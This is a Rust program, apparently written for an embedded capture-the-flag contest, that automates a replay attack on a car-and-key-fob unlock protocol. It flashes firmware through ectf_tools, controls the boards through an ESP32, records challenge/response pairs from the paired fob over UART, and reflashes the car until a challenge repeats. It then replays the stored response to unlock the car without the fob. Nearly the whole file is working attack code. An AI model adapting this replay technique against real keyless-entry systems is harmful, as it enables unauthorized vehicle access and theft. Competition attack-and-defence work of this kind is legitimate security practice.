use clap::Parser;
use serialport::SerialPort;
use std::{collections::HashMap, path::PathBuf, process::Command, str, thread, time::Duration};

#[derive(Parser)]
struct Args {
    /// The path of the folder containing the design to flash.
    #[arg(short, long)]
    dev_in: PathBuf,

    /// The name of the car design to flash.
    #[arg(short, long)]
    car_dev_name: String,

    /// The name of the fob design to flash.
    #[arg(short, long)]
    fob_dev_name: String,

    /// The number of unlock attempts to make using the paired fob.
    #[arg(short, long)]
    paired_attempts: u32,

    /// The number of unlock attempts to make after disabling the paired fob.
    #[arg(short, long)]
    unpaired_attempts: u32,

    /// Serial device of the car's UART0.
    car_uart0_serial_file_name: String,

    /// Serial device of the paired fob's UART0.
    fob_uart0_serial_file_name: String,

    /// Serial device of the car's UART1.
    car_uart1_serial_file_name: String,

    /// Serial device of the paired fob's UART1.
    fob_uart1_serial_file_name: String,

    /// Serial device of the ESP32 TI board controller.
    esp32_serial_file_name: String,
}

const BAUD_RATE: u32 = 115200;

const RESET_HOLD_TIME: Duration = Duration::from_micros(20);
const BUTTON_HOLD_TIME: Duration = Duration::from_millis(100);

const CAR_BOARD_NUMBER: u32 = 0;
const FOB_BOARD_NUMBER: u32 = 1;

const UNLOCK_MESSAGE: [u8; 1] = [0x56];
const CHALLENGE_LEN: usize = 64;
const RESPONSE_LEN: usize = 256;

fn reset_board(esp32: &mut Box<dyn SerialPort>, board_number: u32) {
    esp32
        .write_all(format!("l{board_number}r\n").as_bytes())
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(RESET_HOLD_TIME);

    esp32
        .write_all(format!("h{board_number}r\n").as_bytes())
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();
}

fn reset_board_install(esp32: &mut Box<dyn SerialPort>, board_number: u32) {
    esp32
        .write_all(format!("l{board_number}2\n").as_bytes())
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(BUTTON_HOLD_TIME);

    esp32
        .write_all(format!("l{board_number}r\n").as_bytes())
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(RESET_HOLD_TIME);

    esp32
        .write_all(format!("h{board_number}r\n").as_bytes())
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(BUTTON_HOLD_TIME);

    esp32
        .write_all(format!("h{board_number}2\n").as_bytes())
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(Duration::from_secs(1));
}

fn do_mode_change(esp32: &mut Box<dyn SerialPort>, dev1_serial: &str, dev2_serial: &str) {
    esp32
        .write_all(b"l01\n")
        .expect("Failed to write to ESP32.");
    esp32
        .write_all(b"l11\n")
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(BUTTON_HOLD_TIME);

    esp32
        .write_all(b"l0r\n")
        .expect("Failed to write to ESP32.");
    esp32
        .write_all(b"l1r\n")
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(RESET_HOLD_TIME);

    esp32
        .write_all(b"h0r\n")
        .expect("Failed to write to ESP32.");
    esp32
        .write_all(b"h1r\n")
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    thread::sleep(BUTTON_HOLD_TIME);

    esp32
        .write_all(b"h01\n")
        .expect("Failed to write to ESP32.");
    esp32
        .write_all(b"h11\n")
        .expect("Failed to write to ESP32.");
    esp32.flush().unwrap();

    let mut child = Command::new("python3")
        .args([
            "-m",
            "ectf_tools",
            "device.mode_change",
            "--dev1-serial",
            dev1_serial,
            "--dev2-serial",
            dev2_serial,
        ])
        .spawn()
        .expect("Failed to do mode change.");

    child.wait().unwrap();

    // Reset both boards again
    reset_board(esp32, FOB_BOARD_NUMBER);
    reset_board(esp32, CAR_BOARD_NUMBER);
}

fn main() {
    let args = Args::parse();

    let mut car_uart1 = serialport::new(&args.car_uart1_serial_file_name, BAUD_RATE)
        .timeout(Duration::from_secs(5))
        .open()
        .expect("Failed to open UART1 serial port.");

    car_uart1
        .clear(serialport::ClearBuffer::All)
        .expect("Failed to clear UART1 serial port.");

    let mut fob_uart1 = serialport::new(&args.fob_uart1_serial_file_name, BAUD_RATE)
        .timeout(Duration::from_secs(5))
        .open()
        .expect("Failed to open UART1 serial port.");

    fob_uart1
        .clear(serialport::ClearBuffer::All)
        .expect("Failed to clear UART1 serial port.");

    let mut esp32 = serialport::new(&args.esp32_serial_file_name, BAUD_RATE)
        .open()
        .expect("Failed to open ESP32 serial port.");

    reset_board_install(&mut esp32, FOB_BOARD_NUMBER);

    // Flash the fob firmware
    let mut child = Command::new("python3")
        .args([
            "-m",
            "ectf_tools",
            "device.load_sec_hw",
            "--dev-in",
            args.dev_in.to_str().unwrap(),
            "--dev-name",
            &args.fob_dev_name,
            "--dev-serial",
            &args.fob_uart0_serial_file_name,
        ])
        .spawn()
        .expect("Failed to flash fob.");

    child.wait().unwrap();

    // Reset the fob
    reset_board(&mut esp32, FOB_BOARD_NUMBER);

    let mut responses = HashMap::new();

    for _ in 0..args.paired_attempts {
        reset_board_install(&mut esp32, CAR_BOARD_NUMBER);

        // Flash the car firmware
        let mut child = Command::new("python3")
            .args([
                "-m",
                "ectf_tools",
                "device.load_sec_hw",
                "--dev-in",
                args.dev_in.to_str().unwrap(),
                "--dev-name",
                &args.car_dev_name,
                "--dev-serial",
                &args.car_uart0_serial_file_name,
            ])
            .spawn()
            .expect("Failed to flash car.");

        child.wait().unwrap();

        // Reset the car
        reset_board(&mut esp32, CAR_BOARD_NUMBER);

        thread::sleep(Duration::from_secs(1));

        // Press the fob button
        esp32
            .write_all(b"l11\n")
            .expect("Failed to write to ESP32.");
        thread::sleep(BUTTON_HOLD_TIME);
        esp32
            .write_all(b"h11\n")
            .expect("Failed to write to ESP32.");

        let mut request_byte = [0; 1];
        match fob_uart1.read(&mut request_byte) {
            Ok(1) => (),
            Ok(n) => println!("Read {n} bytes"),
            Err(e) => panic!("Failed to read from UART1: {}", e),
        }

        let mut challenge_byte = [0; 1];
        match car_uart1.read(&mut challenge_byte) {
            Ok(1) => (),
            Ok(n) => println!("Read {n} bytes"),
            Err(e) => panic!("Failed to read from UART1: {}", e),
        }

        // Receive a challenge from the car
        let mut challenge = [0; CHALLENGE_LEN];
        match car_uart1.read(&mut challenge) {
            Ok(CHALLENGE_LEN) => {
                println!("Received challenge {challenge:?}");
            },
            Ok(n) => panic!("Tried to read {CHALLENGE_LEN} bytes from UART1 but only got {n} bytes: {challenge:?}"),
            Err(e) => panic!("Failed to read from UART1: {}", e),
        }

        let mut response_byte = [0; 1];
        match fob_uart1.read(&mut response_byte) {
            Ok(1) => (),
            Ok(n) => println!("Read {n} bytes"),
            Err(e) => panic!("Failed to read from UART1: {}", e),
        }

        // Receive the response from the paired fob
        let mut response = [0; RESPONSE_LEN];
        match fob_uart1.read(&mut response) {
            Ok(RESPONSE_LEN) => {
                println!("Received response {response:?}");
                responses.insert(challenge, response);
            }
            Ok(n) => {
                panic!("Tried to read {RESPONSE_LEN} bytes from UART1 but only got {n} bytes: {response:?}")
            }
            Err(e) => panic!("Failed to read from UART1: {}", e),
        }
    }

    let mut found = false;

    for _ in 0..args.unpaired_attempts {
        reset_board_install(&mut esp32, CAR_BOARD_NUMBER);

        // Flash the car firmware
        let mut child = Command::new("python3")
            .args([
                "-m",
                "ectf_tools",
                "device.load_sec_hw",
                "--dev-in",
                args.dev_in.to_str().unwrap(),
                "--dev-name",
                &args.car_dev_name,
                "--dev-serial",
                &args.car_uart0_serial_file_name,
            ])
            .spawn()
            .expect("Failed to flash car.");

        child.wait().unwrap();

        do_mode_change(
            &mut esp32,
            &args.car_uart0_serial_file_name,
            &args.fob_uart0_serial_file_name,
        );

        // Reset the car
        reset_board(&mut esp32, CAR_BOARD_NUMBER);

        thread::sleep(Duration::from_secs(1));

        car_uart1
            .write_all(&UNLOCK_MESSAGE)
            .expect("Failed to write to UART1.");
        car_uart1.flush().unwrap();

        let mut challenge_byte = [0; 1];
        match car_uart1.read(&mut challenge_byte) {
            Ok(1) => (),
            Ok(_) => println!("hmm"),
            Err(e) => panic!("Failed to read from UART1: {}", e),
        }
        println!("{challenge_byte:?}");

        // Receive a challenge from the car
        let mut challenge = [0; CHALLENGE_LEN];
        match car_uart1.read(&mut challenge) {
            Ok(CHALLENGE_LEN) => {
                println!("Got challenge {challenge:?}");
            }
            Ok(n) => {
                println!("{challenge:?}");
                panic!("Tried to read {CHALLENGE_LEN} bytes from UART1 but only got {n} bytes.")
            }
            Err(e) => panic!("Failed to read from UART1: {}", e),
        }

        // If we've seen this challenge before, we can replay the response
        if let Some(response) = responses.get(&challenge) {
            println!("Found a response for the current challenge");

            // Send the response to the car and wait
            car_uart1
                .write_all(response)
                .expect("Failed to write to UART1.");
            thread::sleep(Duration::from_millis(100));

            // Receive the unlock message and print it
            let mut unlock_received = [0; 1024];
            match car_uart1.read(&mut unlock_received) {
                Ok(n) => {
                    println!("{}", str::from_utf8(&unlock_received[..n]).unwrap());
                }
                Err(e) => panic!("Failed to read from UART1: {}", e),
            }

            found = true;
        }

        // Do another mode change to allow flashing the boards again
        do_mode_change(
            &mut esp32,
            &args.car_uart0_serial_file_name,
            &args.fob_uart0_serial_file_name,
        );

        if found {
            break;
        }
    }
}
